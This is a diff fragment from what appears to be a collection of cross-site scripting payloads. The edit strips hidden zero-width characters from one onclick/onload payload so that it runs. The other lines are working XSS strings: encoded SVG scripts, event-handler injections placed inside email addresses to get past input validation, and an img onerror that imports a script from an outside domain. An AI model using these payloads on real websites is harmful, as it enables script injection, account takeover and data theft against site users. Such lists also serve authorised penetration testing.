@@ -53,7 +53,7 @@ a onclick="alert(1)">XSS</a>
 %3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%3Cscript%3Eprompt%28%22XSS%22%29%3C%2Fscript%3E%3C%2Fsvg%3E
 <svg+onload%3Dalert%26%230000000040+"1")> –
 ab@gmail.com'\"><svg/onload=alert(/xss/)>
-"onclick​=prompt(8)><svg/onload​=prompt(8)>"@x.y.
+"onclick=prompt(8)><svg/onload=prompt(8)>"@x.y.
 <Svg/OnLoad=alert(1337)>"@gmail.com
 "><img/src/onerror=import('//domain/')>"@gmail.com
 <select><noembed></select><script x='a@b'a> y='a@b'//a@b%0a\u0061lert('CYBERTIX')</script x>
